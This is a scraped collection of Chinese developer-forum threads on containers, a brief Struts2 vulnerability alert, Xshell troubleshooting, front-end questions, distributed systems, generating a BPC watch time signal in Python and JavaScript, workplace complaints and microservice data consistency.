{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>汇总一周容器圈热点资讯，让开发者了解最 in 的容器技术，让企业熟知最实时的国内外容器行业动态。</p>\n<h2>RexRay 0.8 新版本结合 Docker 17.03 插件系统，支持云平台持久化存储</h2>\n<p>DellEMC Rex-Ray 0.8 最终版本于上周发布。作为 {code} 社区的高级项目产出， Rex-Ray 0.8 是迄今为止最为重大的一次发布。新发布的版本引入了新功能，支持众多存储平台，包括 S3FS, EBS, EFS, GCEPD &amp; ScaleIO 等，更多平台可参考下图。\n<img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/rexray010-768x409.png\"></p>\n<p>新发布的 Docker 17.03 ，引入了新的管理插件系统，因此现在 RexRay 可以完美地在 Docker 容器中运行。 Rex-Ray Volume  插件使用 go 语言，为包括 VirtualBox, EC2, Google Compute Engine, OpenStack 和 EMC 等众多平台提供先进的存储功能。</p>\n<p>欲知详情，<a href=\"http://automanualebook.com/news/Introducing-new-RexRay-0.8-with-Docker-17.03-Managed-Plugin-System-for-Persistent-Storage-on-Cloud-Platforms\" rel=\"nofollow\">请点此查看</a></p>\n<h2>2017 技术趋势调查， Docker 成赢家</h2>\n<p>JAXenter 对 2017 年技术趋势展开调查（为期一个月，受访人数 900+ )。在容器技术趋势方面， Docker 成为最大的赢家，吸引了接近 80% 的受访者的关注和兴趣，其次是 Kubernetes 和 CoreOS 。</p>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/Screen-Shot-2017-03-07-at-1.51.55-PM.png\"></p>\n<p>欲知详情，<a href=\"https://jaxenter.com/technology-trends-2017-these-are-the-most-popular-tools-132109.html\" rel=\"nofollow\">请点此查看</a></p>\n<h2>从 dotCloud 到 Docker</h2>\n<p>“你听说过 dotCloud 吗？如果还没有，那么我给你些提示：一家 PAAS 平台公司。另一个提示：后来这家公司开源了它们的容器引擎。这个容器引擎就是后来的 Docker 。”</p>\n<p>这是关于 dotCloud 这家公司在初期设计时的描述，其中一些构想塑造了如今的 Docker 。在《从 dotCloud 到 Docker 》这篇文章中，你可以找到更详尽的描述，包括 dotCloud 当时成立的背景、 Docker 容器技术的进化、以及微服务和编排的发展。读者可以获得 dotCloud 公司成功和失败的经验，并理解 Docker 为何如此构建。</p>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/screen-shot-2011-07-02-at-4-43-15-pm.png\"></p>\n<p>欲知详情，<a href=\"http://jpetazzo.github.io/2017/02/24/from-dotcloud-to-docker/?mkt_tok=eyJpIjoiT1RZeE16WTVaR1U1WkRNMiIsInQiOiJrSkJcL0JqVFwvZCthdWtOdnhWNVRzNmVRODY1NTVZZmtpekRCMVFKY3FCNWJpOENWVURhQjhQQnZJUVh2S1FZNVNOcXVcL3FTNWhSUUt5cWwxd25iUmpcL2dsYW1wT0d6ZUVNT1wvaFBpdUpMUTdKbk01bDdkaUNDYUlRUG9aQ0NvZUJjIn0=\" rel=\"nofollow\">请点此查看</a></p>\n<h2>谷歌云容器生成器正式推出，让 Docker 容器创建更便捷</h2>\n<p>3 月 6 日，谷歌宣布谷歌云容器生成器向普通用户开放。现在用户可以在谷歌云平台上构建 Docker 容器。谷歌称该云容器生成器更快速、可靠，希望通过命令行界面、自动构建触发器和构建步骤，能够让用户体验到灵活的构建。用户可以利用谷歌云存储中的应用资源代码创建 Docker 容器镜像。这些容器镜像会自动存储在 Google Container Registry 中。</p>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/TWTH-%E7%BE%8E%E5%9B%BD%E9%9B%86%E8%A3%85%E7%AE%B1%E5%88%B0%E9%97%A8.jpg\"></p>\n<p>欲知详情，<a href=\"https://jaxenter.com/google-cloud-container-builder-is-here-132110.html\" rel=\"nofollow\">请点此查看</a></p>\n<p>这一期的『航海日志』就到这里，下期再浪～</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "2017 技术趋势调查， Docker 成赢家 | 航海日志 Vol.07 (03.06-03.12)", "comment": []},
{"content": ["<div class=\"topic_content\"> [重大漏洞预警]  Struts 2 远程代码执行漏洞(s2-045\\s2-046)\r<br>3 月 21 日凌晨，惠普社区等发布 S2-046 的漏洞，该漏洞与 S2-045 原理相同，只是在触发区域在 filename 字段中。</div>"], "reply": "目前尚无回", "tittle": "Struts2 继续爆洞", "comment": []},
{"content": ["<div class=\"topic_content\">貌似在 Windows 10 1607 第一个版本就出现了，有时候 vim 编辑一个文件，编辑着编辑着，就没反应了， xshell 没反应就算了，其他软件也跟着没反应，只能够通过任务管理器杀死 xshell 进程才算正常，好气哟。\r<br>替代方案求不要贴了，只是想问问除了放弃 xshell 之外的解决方案，谢谢！</div>"], "reply": "10", "tittle": "Windows 10 Enterprise 1067 使用 Xshell 经常性卡死，有无解决办法", "comment": ["把心跳频率调到 60 以上。不要用他自己的那个心跳。 如果要保持的话， 请用 screen 。或者用 top 进行保持", " 和这个有关系吗？这个我已经调过了，但是有时候我刚登陆进去，打开配置文件，然后就卡住了，瞬间懵逼", "求教 xshell 怎么让光标在 vim 中编辑状态是块状，插入模式是竖线状？现在很蛋疼的在使用 minttty", " 你这个需求比较厉害，我不会", " 是！ 我曾经碰掉你一样的问题。 而且会导致系统其他的进程都假死了，切换窗口都切换不了，我表示，以为 10 不稳定，换系统了都，也是一样的。 后来 我碰掉了，直接重新修改属性。保持活动的 那个", "我怎么没碰到...", "以前会遇到，后面更新了 xshell 就没发现了，楼主在用老版？", "Windows 10 Pro 最新版+最新版 Xshell 没有类似问题。", "教育版并没有遇到，另外可以用 cmder", "你打开你的资源管理器看看，那段时间的硬盘使用率是不是 100%，如果是，那这是 windows 本身的一个 bug"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>twitter 的发表框支持插入表情,网络上的教程都是使用 iframe 来创建的,他的没有 iframe 他是什么原理实现的?</p>\n<p>我希望用 jquery 实现,如果可以,感谢.</p>\n<p><img alt=\"\" src=\"https://ww3.sinaimg.cn/large/006tKfTcgy1fdm4g5ojrtj30m8041glr.jpg\"></p>\n</div></div>", "<div class=\"topic_content\">如果有完整的文档就好了</div>"], "reply": "6", "tittle": "Twitter 发表内容的富文本框是什么原理制作的?", "comment": ["我感觉这个是 Emoji ？", "审查元素啊兄弟", "contenteditable", "div contenteditable", " 是 img", "看起来这个并不是富文本框，只是看起来像，是直接在 div 里面插 dom 的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>:art:</p>\n</div></div>"], "reply": "2", "tittle": "找一个迅速搭建管理系统的前端脚手架", "comment": ["AdminLTE", "搜 “ dashboard template ”，一把一把的。"]},
{"content": ["<div class=\"topic_content\">原文：\r<br>Topic: performance\r<br>  Distribution can hurt: network b/w and latency bottlenecks\r<br>    Lots of tricks, e.g. caching, concurrency, pre-fetch\r<br>  Distribution can help: parallelism, pick server near client\r<br>  Idea: scalable design\r<br>    Nx servers -&gt; Nx total performance\r<br>  Need a way to divide the load by N\r<br>    Divide data over many servers (\"sharding\" or \"partitioning\")\r<br>    By hash of file name?\r<br>    By user?\r<br>    Move files around dynamically to even out load?\r<br>    \"Stripe\" each file's blocks over the servers?\r<br>  Performance scaling is rarely perfect\r<br>    Some operations are global and hit all servers (e.g. search)\r<br>      Nx servers -&gt; 1x performance\r<br>    Load imbalance\r<br>      Everyone wants to get at a single popular file\r<br>      -&gt; one server 100%, added servers mostly idle\r<br>      -&gt; Nx servers -&gt; 1x performance\r<br>\r<br>问题的地方：\r<br>Some operations are global and hit all servers (e.g. search)\r<br>      Nx servers -&gt; 1x performance\r<br>问题：为什么 search 功能， N 台机器反而性能没有提升？</div>"], "reply": "目前尚无回", "tittle": "6.824 笔记的第一章阅读遇到的问题", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://www.hackrf.net/2016/10/BPC%E7%94%B5%E6%B3%A2%E6%8E%88%E6%97%B6%E4%BF%A1%E5%8F%B7%E7%9A%84%E9%9B%B6%E6%88%90%E6%9C%AC%E4%BC%AA%E9%80%A0/\" rel=\"nofollow\">来源 http://www.hackrf.net</a></p>\n<p>有个六局电波的西铁城，由于地理位置偏僻收不到波</p>\n<p>网上看到了这个  《 BPC 电波授时信号的“零成本”伪造》\n用 Python+耳机发射授时信号</p>\n<p>上网查了查 在苹果商店发现一个 app  售价 12  但是没有苹果手机</p>\n<p>觉得要是把他的代码改到 js 里面就可以在浏览器里面运行对时就非常方便了</p>\n<p>目前只完成了时间转 base4 部分 但是 js 音频发声转换部分没有思路 对音频和波形没有研究过</p>\n<p>看了两个库  timbre.js 和 lame.js 不知是否可行</p>\n<p>python 代码</p>\n<pre><code># -*- coding: utf-8 -*-\n\"\"\"\nCreated on Tue Jan 19 15:26:45 2016\n\n@author: zhengbowang\n\"\"\"\nimport pyaudio\nimport struct\nimport datetime\nimport math\n\ndef dropandfill(l,s):return '0'*(l - len(s[2:])) + s[2:]#用 0 补位\ndef time2code(date_time, dt = datetime.timedelta(0)):\n\n#将时间转换成 BPC 编码。\n\n    date_time -= dt\n    date = [date_time.day, date_time.month, date_time.year]\n    timet = [date_time.hour,date_time.minute,date_time.weekday()+1]\n    date[2] = date[2]%100#year\n    timet[0] = timet[0]%12#am.pm\n    p1 = dropandfill(2,bin(date_time.second/20))#seconds\n    p2 = '00'#reserved\n    sec1 = (p1+p2)+''.join(map(dropandfill,[4,6,4],map(bin,timet)))\n    p31 = str(int(date_time.hour&gt;=12))\n    p32 = str((sec1.count('1'))%2)\n    p3 = p31 + p32\n    sec2 = ''.join(map(dropandfill,[6,4,6],map(bin,date)))\n    p41 = str(int(date_time.year%1000&gt;100))\n    p42 = str(((sec2.count('1'))%2))\n    p4 = p41 + p42\n    code2 = sec1 + p3 +sec2 + p4\n    bin2four = {'00':'1','01':'2','10':'3','11':'4'}#to base4\n    return '0'+''.join([bin2four[code2[2*i:2*i+2]] for i in range(len(code2)/2)])\n\ndt = datetime.timedelta(hours = 1)#fake time shift\nsamp_rate = 68500\nfreq = 6850 * 2 #in Hertz\nttime =20 #in Sec\nSAMPLE_LEN = samp_rate * ttime # 20 seconds of cosine\nvalue = ampl = 32725\ndiv = samp_rate/freq/2\ndata = 32725\n# 打开声音输出流\np = pyaudio.PyAudio()\nstream = p.open(format = 8,\n                channels = 1,\n                rate = samp_rate,\n                output = True)\n\nwhile True:\n    date_time = datetime.datetime.now()+dt\n    print date_time\n    sec = (date_time.second+1)%20\n    code_str = time2code(date_time)\n    start = sec * samp_rate\n    for i in xrange((start), SAMPLE_LEN):\n        #if i % div == 0:value = -value#carrier generate\n        value = ampl * int(math.cos(math.pi / float(div) * float(i)))\n        pulse = (i - sec * samp_rate)/(samp_rate / 10)\n        packed_value = struct.pack('h', int(pulse &gt;= int(code_str[sec]))*value)\n        stream.write(packed_value)\n        if i % samp_rate == 0 and i != start: \n            sec = sec + 1\n</code></pre>\n<p>转到一半的 js 代码</p>\n<pre><code>function time2code(date_time) {\n            var date = [date_time.getDate(), date_time.getMonth() + 1, date_time.getFullYear()];\n            var timet = [date_time.getHours(), date_time.getMinutes(), date_time.getUTCDay()];\n            date[2] = date[2] % 100; //year\n            timet[0] = timet[0] % 12; //am,pm\n            var p1 = dropandfill(2, parseInt(date_time.getSeconds() / 20).toString(2)); //seconds\n            var p2 = '00'; //reserved\n            var sec1 = (p1 + p2) + '' + join(map(dropandfill, [4, 6, 4], map(bin, timet)))\n            var p31 = Number(date_time.getHours() &gt;= 12).toString();\n            var re = new RegExp(\"1\", \"g\");\n            var p32 = str((sec1.match(re).length) % 2)\n            var p3 = p31 + p32;\n\n            var sec2 = '' + join(map(dropandfill, [6, 4, 6], map(bin, date)));\n            var p41 = str(Number(date_time.getFullYear() % 1000 &gt; 100))\n            var p42 = str(((sec2.match(re).length) % 2))\n            var p4 = p41 + p42\n            var code2 = sec1 + p3 + sec2 + p4\n            var bin2four = { '00': '1', '01': '2', '10': '3', '11': '4' } //to base4\n            var ret = [];\n            ret.push('0')\n            for (var i = 0; i &lt; code2.length / 2; i++) {\n                ret.push(bin2four[code2.substring(i * 2, i * 2 + 2)]);\n            }\n            return join(ret);\n        }\n\n        //用 0 补位\n        function dropandfill(size, num) {\n            var s = \"000000000\" + num;\n            return s.substr(s.length - size);\n        }\n\n        function map(a, b) {\n            if (arguments.length == 2) {\n                for (var i = 0; i &lt; arguments[1].length; i++) {\n                    arguments[1][i] = arguments[0](arguments[1][i]);\n                }\n                return arguments[1];\n            }\n            if (arguments.length == 3) {\n                for (var i = 0; i &lt; arguments[1].length; i++) {\n                    arguments[1][i] = arguments[0](arguments[1][i], arguments[2][i]);\n                }\n                return arguments[1];\n            }\n\n        }\n        function bin(e) {\n            return e.toString(2);\n        }\n        function join(e) {\n            var ret = \"\";\n            for (var i = 0; i &lt; e.length; i++) {\n                ret += e[i];\n            }\n            return ret;\n        }\n        function str(e) {\n            return e.toString();\n        }\n</code></pre>\n</div></div>"], "reply": "目前尚无回", "tittle": "BPC 电波授时信号 Python 转 js 实现一半 求助", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>忘记了自己的高考分数，怎么查询以前的高考成绩</p>\n</div></div>"], "reply": "117", "tittle": "怎么查询以前的高考成绩？", "comment": ["08 年高考，江苏 368 学渣路过", " 卧槽，我也 543 ，特别好记，但是单科忘了", "楼主就想问问怎么查高考成绩，结果一大波无关话题出来了。。。", "据说教育局有存档,只有教育局才容易查到.", "  哪一年一本是 537 ，我当年二本线 537 ！", "高考成绩没记过 只是在我们学校的录取系统中截了个已被我校录取的图", "我觉得自己特别牛叉的是，把高考分数考得和中考分数完全一样！", "说起来我也忘了。", " 你好", "07 年江苏，总分 608 。\r", "妈的，考化学之前喝了一瓶红牛，结果考试的时候，脑袋里全是空的！！\r", "有个元素属性的那种填空题， 10 分。一分没拿到！草！", " 08 年，是三科 + ABC 吧。", "当年数学考惨了只有 90 分，突然就感冒了考完出来考场外面就吐了，还好最后理综一鼓作气考了 272", " 是的", " \r", "06 年 609🤣", " 2011 年，安徽省理科。", "楼主想问怎么查分 TM 一堆出来秀成绩的什么鬼？\r", "百度直接搜”名字+省份+时间“ 我的用这种方法可以查到。\r", "要是认真一点的话 可以去学信网查", " 如果只是查着玩，多用搜索引擎变着信息查肯定能找到。如果是有正规用途，学信网可以查到并且出具证明，收费（应该不贵）。 ww 哈 w.ch 哈 si.c 哈 om.c 哈 n/哈 wssq/"]},
{"content": ["<div class=\"topic_content\">工作好几年了，经历了几家公司。遇到过几个同事，其中印象最深的当属其中两家的情况。\r<br>\r<br>---\r<br>先说说其中一家的情况，也算是护食还算轻一点的。\r<br>入职以后只见组长对我们新人（包括我 2 个新人），各种指导和教育。当时还心里觉得跟了个厉害的大神，因为当时工作阅历还很浅，写代码确实不行。但是接下来的半年我都快受不了了，因为前期还是在学，到了后面就觉得有点分歧。因为 C++本来就是一定程度上比较复杂（或者说不严谨）的开发语言。而我这位组长恰好是模板特性开发者，很多时候很喜欢通过模板来实现一些功能，然后做业务层面确实有一定优势，但在部分地方越看越觉得臃肿和累赘。曾经提出过疑问（非质疑），后来也和我讲了缘由，最终我被他反问给弄的不再有任何“疑问”（他问：“你觉得除了模板还有什么好的方法？”）。这位哥们在公司里还算是稍好的人（指为人待事）。但后来经历了几个老油条以后就觉得很是痛苦；线上出问题，张口就说自己没问题，非要我们去查自己的模块，最后兜了一圈回来还是落到他的身上，问其原因得到的答复基本都是东扯西拉。\r<br>\r<br>---\r<br>再说说另一家，也是我感到相对严重的一家。\r<br>入职快一个月的时候，代码是通过 QQ 传给我（传给我的还是开源代码部分，并且编译环境要重新改才能编译通过），连个起码的 svn 账号都不给。未作任何产品对应的模块介绍的情况下，入职第二个星期开始就定位线上问题（第一个星期被配的破电脑折腾惨了，最后没办法公司采购了一个新电脑）。线上问题一般反馈给我的就两个：现象、日志。\r<br>而对于日志来说，除了开源代码的少部分日志能看明白，其他他们内部自己写的部分我就只能看日志是否有好，和我能否理解了。\r<br>\r<br>我主动问过几次，能不能说一下上层怎么使用这个开源代码的，结果反被教育：“你看开源代码不就好了吗？有日志啊……”，整一个过程下来似乎就把我当作三岁小孩一样糊弄。问题相关的有效日志就一小段，指导用户操作（用来复现并产生日志）的是你，教我怎么定位还是你。我就奇怪了，为啥你不来定位？万能话说了一大堆，没几句说道点子上。\r<br>后来有一次哥们请假还是出差不在公司，技术支持来找我，我和技术支持远程看，分分钟解决（用户环境问题）。不知道要是如果我不去远程，不知道会不会又要看日志折腾几天。\r<br>\r<br>\r<br>\r<br>\r<br>---\r<br>要说护食，就数后面这家最明显，首先给我定位模块的代码不是通过 svn 拿，通过 QQ 给。这就是不信任我或者存在其他用意，不做业务介绍，来了就直接看日志，而且有效日志少的可怜，无关日志一大堆。遇到问题，总是事事挡在前面，虽然我可以减少一定的压力，但很多信息在传递过程中已经损失了一部分有效内容。\r<br>喜欢老生常谈的方式讲一大堆定位的方法，但结果有时会出现风马牛不相及；尤其是上述的第一家那哥们，有时吹牛皮都吹歪了。\r<br>\r<br>\r<br>虽然自己年纪也不小了，按照程序员生命周期来看，可能也不长了。但是在无法理解这些护食 /我最大是一种怎样的心理？而且似乎这类现象在一些年纪稍大且越待在一个封闭环境下的人表现起来就越严重。\r<br>\r<br>\r<br>ps ：两家公司都在细分领域有一定名声的公司，很想贴公司名，但想想算了，杭州 IT 圈很小。\r<br>另外这两家公司我所遇到的 leader 也存在一些共同点，创业之初跟着公司一起过来的，也算是老油条了。\r<br>面试的时候，公司氛围给我的感觉也是很怪，如果不是为了继续在摸个技术领域做下去，我也不会选择这两家。</div>"], "reply": "17", "tittle": "护食/我最大是一种怎么样心里？", "comment": ["赞一个", "护食啥意思，不想让你干太多，免得你抢了他的活？", "不知道啥是护食，方言还是网络用语？", "我是动物世界看多了？ 你这个护食是啥意思……", "纯吐槽：在 V2EX 上使用带错别字的知乎体是怎么样的一种心“里”？", "没看出第 1 个的组长有什么问题， 你不喜欢模板， 又说不出自己的见解， 难道别人为了照顾你把好好的代码改掉？", " \r", " \r", " 和动物世界的护食类似。就是做事情并不是怕我干多或者干少，而是怕丢饭碗。当接触的多了，就能感觉到做有一些事情似乎为了保住自己的地盘或者饭碗的行为。\r", "\r", "\r", " 整个工程代码 90%是模板。", " 再吐槽，不上知呼，不要给扣帽子，我不会写知乎体，可能是巧合！", " 这样子，人家年龄大了有家庭压力，有这种心理也很正常吧。", " C++有模板， OO ，过程式， 函数式，风格多种多样，很正常。", " 是正常，不过 90%单一用模板。整个工程只用 2 中设计模式（单例、组装），然后哥们哥们大谈特谈代码怎么写好，我就迷惑了。因为当时我参考了 boost 和 chromium 的代码结构，可以优化。所以就这样郁闷了。\r", "\r", " 年纪大有压力也应该是，只不过我觉得做的有点过分了，尤其是第二家。", "其实没必要那么在乎，以前在几家公司经常看到为了框架或者代码实现争吵的，严重的时候有人离职，一般这种情况我就提一下，如果领头人坚持，我就按照他们想要的方法去做，有时候他们发现我主导的那个项目模块封装的确实更好，他们也会拿来用，基本上我每到一家公司都用他们的方式写代码，无论是前后端还是客户端，但是我自己的项目相当简洁，毕竟就我自己看", " boost 跟 chromium 也是人写出来的，他们写的也不一定好，你说好的最好是有 profile 的报告，要不然谁也不愿意去动生产的代码啊。\r", "你可以改完出报告啊，事实胜于雄辩，在报告面前他也不好说什么", " 感谢劝导。其实我现在也越来越不爱争了。不过不知道大家怎么把问题的焦点集中到代码框架和代码编写上来，我其实更像吐槽（或者说喷）的是第二家，因为我都过来这么久了，之前老电脑的硬件有问题没有和我说，折腾许久才买了新电脑。另一个是代码 svn 权限不给就算了，让我定位问题，至少要么搞清楚其他模块在干啥什么的，要么给点参考资料，不可能说把我当作一个已经在公司待了许久的老人来对待吧。\r", "\r", "即便我有工作经验，但应该的“友好”还是需要的，各种做法上给我感觉到不仅在指挥我做事情，更像是随便给点事情凉一边，有意考察这个人的性格和能力的味道。都是打工的我只是觉得没有必要，我面试的时候就已经说过，我只对技术有兴趣。定位问题，如果有没有尽可能的现场或者复现条件，犹如自费双臂。更何况出了问题以后是他要求用户如何操作，接着把日志丢给我，也不和我说，我去问还挺不耐烦，这一点我是有点不开心的。\r", "\r", "在一个给我的开源代码是他们修改的编译环境和部分代码，主要是 google 系列的大工程编译环境比较坑爹（ android 、 ios 、 windows ）。他能编译过去的 mac 拿过来，拿他给我的代码，直接没法编译，最后还是我一个人在弄。这坑我也趟过去了，也没说啥，就是沟通的时候态度有时让我感觉不友好。看得出来除了确实工作烦了以外，还有一点他个人的性格在里面。", " 我没有说 google 系代码好，因为近年来这些大公司很奇怪，招聘是不是也开始走廉价路线。但是有一点，他们代码中的有一些思路和方法值得借鉴，有时都可以避免重复造轮子，拿过来用也可以。\r", "\r", "对于大家焦点的第一家公司那个情况，我当时也没多争，我摸摸看代码。主要是这哥们不知想着啥，喜欢贯彻他的一些想法和思维，就像他在看《大话设计模式》一样，看了以后也不知道有没有理解清楚，就直接在代码里实践。\r", "\r", "比如红黑树，也是直接在代码里实践，注意哈，是我们产品的代码。\r", "\r", "但有时我觉得第一家公司的这位哥有点把简单问题复杂化的感觉。可能最近在学啥，代码风格、语言特性、设计思维全部都是最近在学的内容。导致我们几个小弟看代码非常累。。。。。。不过这都过去了。。。。\r", "\r", "我还是想说第二家的不友好", " 如果像你这样形容，第一家公司的哥们是个大坑啊！这是将公司产品当试验田啊！", " 技术上说，我上文中描述的第一家公司是大坑，说句不好听的，老员工和我们新员工的代码技能相差不大，差的就一些解决线上问题的经验和业务熟悉度。不过也不用多说了，反正因为是乌合之众，当年内部是乌烟瘴气的。和我无关，我也不管这么多了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>Thor for iOS</h1>\n<p><img alt=\"\" src=\"http://ojtigb0mc.bkt.clouddn.com/thor_logo.png\"></p>\n<p>iOS 端强力专业的 HTTP 抓包分析工具 - Thor</p>\n<h3>免费参加 TestFlight 公测的途径</h3>\n<ul>\n<li>发送要参加公测的邮箱地址到邮箱 beta@pixelcyber.com</li>\n</ul>\n<h3>功能</h3>\n<h4>支持解码的图片格式</h4>\n<ul>\n<li>\n<p><code>jpg, png, gif, webp, apng, jp2, tiff, bmp, ico, icns</code></p>\n</li>\n<li>\n<p><code>svg, psd</code></p>\n</li>\n</ul>\n<h4>支持解压缩 (含密码)</h4>\n<ul>\n<li><code>zip, rar, 7z, tgz, tar, bz, tbz, gz</code></li>\n</ul>\n<h4>优异的性能</h4>\n<ul>\n<li>\n<p>轻松记录成千上万个包</p>\n</li>\n<li>\n<p>保持整天打开的状态也不会对网络的日常使用产生任何影响</p>\n</li>\n</ul>\n<h4>智能解析 HTTP 包数据</h4>\n<ul>\n<li>自动解析 HTTP body 为常见媒体形式</li>\n</ul>\n<h4>灵活强大的过滤规则配置</h4>\n<ul>\n<li>支持按域名，关键字等配置过滤的包</li>\n</ul>\n<h4>实时抓包</h4>\n<ul>\n<li>对请求的整个生命周期状态实时更新</li>\n</ul>\n<p><strong>HTTPS 解码正在紧张开发中...</strong></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "iOS 端强力专业的 HTTP 抓包分析 App - Thor 诚邀内测", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>  有知道的童鞋吗，求告知，谢谢啦！！</p>\n</div></div>"], "reply": "6", "tittle": "org.apache.ibatis.jdbc.SQL 是在哪个版本的 jar 包里面， sqlmap 最近几个版本都找了，找不到。。。", "comment": ["mybatis 啊？", "肯定不是用的 IDEA...", " 是 idea ， idea 都找不到。。看了一下最近版本的 sqlmap 的 jar 包，下面都没有 SQL 这个 class 了。。。", "头像有毒", " 额。。什么意思"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>微服务在业界正获得越来越多的关注，理解微服务架构模式，对现有企业应用转型升级大有帮助。如何快速学习微服务中复杂的概念，掌握其实践，成为众多学习者关注的问题。 DaoCloud 首席架构师王天青 Grissom 为大家带来「<strong>3 分钟学习微服务</strong>」系列，为微服务学习 <strong>划 重 点</strong> ！上一期，我们推出了<a href=\"http://blog.daocloud.io/3-%E5%88%86%E9%92%9F%E5%AD%A6%E4%B9%A0%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%B3%BB%E5%88%97-cap-%E5%AE%9A%E7%90%86%E5%92%8C%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/\" rel=\"nofollow\">《 CAP 定理和数据一致性》</a>，今天继续推出：<strong>互联网系统的一致性解决方案</strong>。</p>\n<h2>场景</h2>\n<p>一个转账业务操作，需要同时调用<strong>记账服务</strong>（ Account Service - AS ）和<strong>支付服务</strong>（ Payment Service - PS ），需要满足要么同时成功；要么同时失败。记账服务和支付服务可能是多个不同部门开发、部署在不同服务器上的远程服务。</p>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/aid1367699-728px-Make-a-Bank-Transfer-Payment-Step-6.jpg\"></p>\n<h2>分布式事务解决方案</h2>\n<p>我们可以使用分布式事务将记账操作和支付操作变为一个整体操作。好处很明显，可以实现数据强一致性，但是分布式事务由于有很多的同步操作， 对系统的吞吐量和请求的响应时间产生较大的影响。</p>\n<h2>思考</h2>\n<p>在<strong>工程实践</strong>上，为了保障系统的可用性，互联网系统大多将强一致性需求转换成最终一致性的需求，并通过系统执行幂等性的保证，保证数据的最终一致性。但在<strong>电商等场景</strong>中，对于数据一致性的解决方法和常见的互联网系统（如 MySQL 主从同步）又有一定的区别。</p>\n<h2>消息及补偿机制</h2>\n<p>另外一种方式是使用<strong>消息及补偿机制</strong>来确保最终一致性，并同时避免分布式事务。此方案的核心是将需要分布式处理的任务通过消息日志的方式来异步执行。消息日志可以存储到本地文本、数据库或消息队列，再通过业务规则自动或人工发起重试。人工重试更多的是应用于支付场景，通过对账系统对事后问题的处理。</p>\n<h2>业务设计</h2>\n<p>如果大家读过 <em>Domain Driven Design</em> 这本书，在领域设计中，当领域对象 Aggregator 状态发生变化时，它会发布领域事件（ Domain Event ）给订阅方。我们可以使用领域事件来追踪领域对象的变化并用于维护事件的一致性。</p>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2017-03-14-%E4%B8%8B%E5%8D%8812.34.30.png\"></p>\n<p><strong>原有的做法</strong>：</p>\n<ul>\n<li>同步方法</li>\n<li>要么转账成功，要么转账失败</li>\n</ul>\n<p><strong>现在的做法</strong>：</p>\n<ul>\n<li>异步方法</li>\n<li>增加新的状态，例如转账中</li>\n<li>增加重试机制，尽可能保证转账成功</li>\n</ul>\n<h2>领域事务与事件</h2>\n<p><strong>领域事务（ Domain Transaction ）</strong></p>\n<ul>\n<li>ID （全局唯一）</li>\n<li>Status</li>\n<li>服务事件列表</li>\n</ul>\n<p><strong>领域事件（ Domain Event ）</strong></p>\n<ul>\n<li>ID （全局唯一）</li>\n<li>DT_ID （领域事务 ID ）</li>\n<li>System</li>\n<li>Type</li>\n<li>Status</li>\n<li>Timestamp</li>\n<li>Message</li>\n</ul>\n<p><strong>示例：转账领域事务</strong></p>\n<ul>\n<li>转账开始事件</li>\n<li>转账记账完成事件</li>\n<li>支付完成事件</li>\n</ul>\n<p>事务状态由事件决定</p>\n<h2>事务流程图</h2>\n<p><img alt=\"\" src=\"http://blog.daocloud.io/wp-content/uploads/2017/03/WechatIMG25.jpeg\"></p>\n<h2>对账及补偿机制</h2>\n<ul>\n<li><strong>对账机制</strong>：业务层面宏观监控，例如入账／出账总账平衡</li>\n<li><strong>重试机制</strong>：如果某一步未执行，则重发已经记录的领域事件</li>\n<li><strong>回滚机制</strong>：如果某一步执行失败，则根据领域事件依次回滚之前的操作</li>\n<li><strong>去重机制</strong>：利用事务 ID 和事件 ID 来去重</li>\n</ul>\n<h2>总结</h2>\n<p>这里我们使用<strong>事件机制</strong>和<strong>补偿机制</strong>实现了一种数据一致性的解决方案。该方案具备高吞吐量及低响应时间的特性，但是在某些服务失败场景下会存在数据不一致的情况，需要通过业务设计（引入新的中间状态），对账机制，重试机制，回滚机制等机制来确保数据最终一致性。</p>\n<p>微服务的 Event Sourcing （事件溯源）和 Command Query Responsibility Separation    (CQRS) 模式则天然能够更好支持这种数据一致性方案，我们会在下一篇文章<strong>《使用 Axon 框架实现 CQRS 和 ES 》</strong>中进行详细描述并给出示例实现。</p>\n<h2>推 荐 阅 读</h2>\n<p><a href=\"http://blog.daocloud.io/micro-services-170308/\" rel=\"nofollow\">《 3 分钟学习微服务系列 | 事务及分布式事务》</a>\n<a href=\"http://blog.daocloud.io/3-%E5%88%86%E9%92%9F%E5%AD%A6%E4%B9%A0%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%B3%BB%E5%88%97-cap-%E5%AE%9A%E7%90%86%E5%92%8C%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/\" rel=\"nofollow\">《 3 分钟学习微服务系列 |  CAP 定理和数据一致性》</a></p>\n</div></div>"], "reply": "2", "tittle": "3 分钟学习微服务系列 | 互联网系统的一致性解决方案", "comment": ["好东西，感谢楼猪分享。分布式事务一直有点模糊。", "觉得不错，有干货"]},
